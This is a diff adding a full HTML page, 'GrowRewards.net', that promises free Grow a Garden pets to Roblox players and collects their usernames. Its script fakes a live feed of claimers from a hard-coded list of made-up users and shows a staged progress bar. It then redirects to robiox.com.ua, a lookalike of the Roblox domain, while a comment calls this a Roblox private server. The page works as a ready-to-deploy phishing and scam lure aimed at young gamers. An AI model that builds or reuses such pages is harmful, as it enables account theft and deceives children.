@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>GrowRewards.net</title>
+  <style>
+    @font-face {
+      font-family: "PressStart2P";
+      src: url("https://fonts.gstatic.com/s/pressstart2p/v11/e3t4euO8T-267oIAQAu6jDQyK3nYivw.ttf") format("truetype");
+    }
+
+    /* Disable selection and cursor everywhere */
+    * {
+      user-select: none;
+      -webkit-user-select: none;
+      -ms-user-select: none;
+      cursor: default;
+    }
+    input, textarea {
+      user-select: text !important;
+      -webkit-user-select: text !important;
+      -ms-user-select: text !important;
+      cursor: text !important;
+    }
+
+    body {
+      background-color: #001a00;
+      font-family: "PressStart2P", monospace;
+      color: #fff;
+      text-align: center;
+      font-size: 16px;
+      font-weight: bold;
+    }
+    .neon-green {
+      color: #00ff00;
+      text-shadow: 0 0 6px #00ff00, 0 0 12px #00ff00;
+      font-weight: bold;
+    }
+    .container {
+      margin: 30px auto;
+      max-width: 550px;
+      background: #004d00;
+      border: 4px solid #ff7f00;
+      padding: 30px;
+      border-radius: 8px;
+    }
+    .reward-box {
+      background: #006600;
+      border: 3px solid #fff;
+      margin: 18px;
+      padding: 18px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      font-size: 14px;
+      font-weight: bold;
+    }
+    .reward-box:hover {
+      background: #009900;
+    }
+    .reward-box.selected {
+      border: 3px solid #ff7f00;
+      background: #004d00;
+    }
+    .reward-box img {
+      width: 80px;
+      height: 80px;
+      display: block;
+      margin: 0 auto 10px auto;
+    }
+    .reward-box, .reward-box * {
+      outline: none;
+    }
+    .button {
+      display: inline-block;
+      background: #ff7f00;
+      padding: 14px 28px;
+      margin-top: 20px;
+      font-weight: bold;
+      border: none;
+      border-radius: 3px;
+      text-decoration: none;
+      color: #000;
+      cursor: pointer;
+      font-size: 14px;
+      font-family: "PressStart2P", monospace;
+    }
+    .button:disabled {
+      background: #333;
+      color: #777;
+      cursor: not-allowed;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 999;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0,0,0,0.7);
+    }
+    .modal-content {
+      background: #004d00;
+      margin: 15% auto;
+      padding: 30px;
+      border: 4px solid #ff7f00;
+      width: 360px;
+      text-align: center;
+      color: #ff7f00;
+      font-family: "PressStart2P", monospace;
+      font-size: 14px;
+      font-weight: bold;
+    }
+    .modal-content input {
+      width: 90%;
+      padding: 12px;
+      margin: 14px 0;
+      font-size: 14px;
+      border: 2px solid #ff7f00;
+      text-align: center;
+      font-family: "PressStart2P", monospace;
+      font-weight: bold;
+    }
+    .modal-content button {
+      background: #00ff00;
+      border: none;
+      padding: 14px 24px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 14px;
+      font-family: "PressStart2P", monospace;
+    }
+    .live-claimers {
+      margin: 30px auto;
+      max-width: 550px;
+      height: 200px;
+      overflow: hidden;
+      background: #004d00;
+      border: 4px solid #ff7f00;
+      padding: 20px;
+      border-radius: 8px;
+      text-align: left;
+      font-family: "PressStart2P", monospace;
+      font-size: 14px;
+      font-weight: bold;
+    }
+    .live-claimers h2 {
+      color: #ff7f00;
+      text-shadow: 0 0 6px #ff7f00, 0 0 12px #ff7f00;
+      font-size: 16px;
+      margin-bottom: 14px;
+    }
+    .claimer-entry {
+      margin: 6px 0;
+      color: #00ff00;
+      font-weight: bold;
+    }
+
+    /* Progress bar styling */
+    .progress-container {
+      width: 100%;
+      background: #003300;
+      border: 3px solid #ff7f00;
+      margin-top: 18px;
+      height: 24px;
+      border-radius: 4px;
+      overflow: hidden;
+      position: relative;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: #00ff00;
+      transition: width 0.1s linear;
+    }
+    .progress-text {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: #ff7f00;
+      font-weight: bold;
+      font-size: 12px;
+      text-shadow: 0 0 6px #000, 0 0 12px #000;
+    }
+
+    @media (max-width: 600px) {
+      body {
+        font-size: 14px;
+      }
+      .reward-box img {
+        width: 70px;
+        height: 70px;
+      }
+      .container, .live-claimers {
+        max-width: 95%;
+        padding: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <h1 class="neon-green">GrowRewards.net</h1>
+  <p>Don't forget to like, share, subscribe</p>
+
+  <div class="container">
+    <h2 style="color:#ff7f00">GrowRewards.net</h2>
+    <div class="reward-box" onclick="selectReward(this, 'Candy Blossom Seed')">
+      <img src="ggs.webp" alt="Candy Blossom">
+      CANDY BLOSSOM SEED
+    </div>
+    <div class="reward-box" onclick="selectReward(this, 'Kitsune')">
+      <img src="k.webp" alt="Kitsune">
+      KITSUNE
+    </div>
+    <div class="reward-box" onclick="selectReward(this, 'Dragon Fly')">
+      <img src="lel.webp" alt="Dragon Fly">
+      DRAGON FLY
+    </div>
+    <div class="reward-box" onclick="selectReward(this, 'Raccoon')">
+      <img src="ss.webp" alt="Raccoon">
+      RACCOON
+    </div>
+    <button class="button" id="claimBtn" disabled onclick="openModal()">CLAIM REWARD</button>
+  </div>
+
+  <!-- Username Modal -->
+  <div id="usernameModal" class="modal">
+    <div class="modal-content">
+      <p>ENTER YOUR ROBLOX USERNAME</p>
+      <input type="text" id="usernameInput" placeholder="Your username">
+      <br>
+      <button onclick="confirmClaim()">CONFIRM</button>
+    </div>
+  </div>
+
+  <!-- Loading Modal -->
+  <div id="loadingModal" class="modal">
+    <div class="modal-content">
+      <p>PROCESSING YOUR PET REWARDS</p>
+      <p style="color:#00ff00">Please join to claim your chosen pet</p>
+      <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+        <div class="progress-text" id="progressText">0%</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="live-claimers">
+    <h2>LIVE CLAIMERS!</h2>
+    <div id="claimsFeed"></div>
+  </div>
+
+  <script>
+    let selectedReward = null;
+
+    function selectReward(element, reward) {
+      document.querySelectorAll('.reward-box').forEach(box => {
+        box.classList.remove('selected');
+      });
+      element.classList.add('selected');
+      selectedReward = reward;
+      document.getElementById("claimBtn").disabled = false;
+    }
+
+    function openModal() {
+      document.getElementById("usernameModal").style.display = "block";
+    }
+
+    function confirmClaim() {
+      const username = document.getElementById("usernameInput").value.trim();
+      if (!username || !selectedReward) {
+        alert("Please enter a username and select a reward!");
+        return;
+      }
+      addClaimer(username, selectedReward);
+      document.getElementById("usernameModal").style.display = "none";
+      document.getElementById("usernameInput").value = "";
+
+      startLoading();
+    }
+
+    function addClaimer(username, reward) {
+      const feed = document.getElementById("claimsFeed");
+      const entry = document.createElement("p");
+      const now = new Date();
+      const time = now.toLocaleTimeString();
+      entry.textContent = `${username} claimed ${reward}  ${time}`;
+      entry.classList.add("claimer-entry");
+      feed.prepend(entry);
+    }
+
+    function startLoading() {
+      const modal = document.getElementById("loadingModal");
+      const bar = document.getElementById("progressBar");
+      const text = document.getElementById("progressText");
+      modal.style.display = "block";
+      let progress = 0;
+      bar.style.width = "0%";
+      text.textContent = "0%";
+
+      const interval = setInterval(() => {
+        progress += 2;
+        bar.style.width = progress + "%";
+        text.textContent = progress + "%";
+        if (progress >= 100) {
+          clearInterval(interval);
+          setTimeout(() => {
+            // Redirect to Roblox private server
+            window.location.href = "https://www.robiox.com.ua/games/126884695634066/Grow-a-Garden?privateServerLinkCode=74924073166174605294905811935352";
+          }, 700);
+        }
+      }, 100);
+    }
+
+    const fakeUsers = ["LegendBuilder", "GirlyRoblox", "NoobSlayer", "PixelQueen", "DragonKing", "KittyKat", "ProGamer", "Dreamer123"];
+    const rewards = ["Candy Blossom Seed", "Kitsune", "Dragon Fly", "Raccoon"];
+
+    setInterval(() => {
+      const user = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
+      const reward = rewards[Math.floor(Math.random() * rewards.length)];
+      addClaimer(user, reward);
+    }, 5000);
+  </script>
+</body>
+</html>
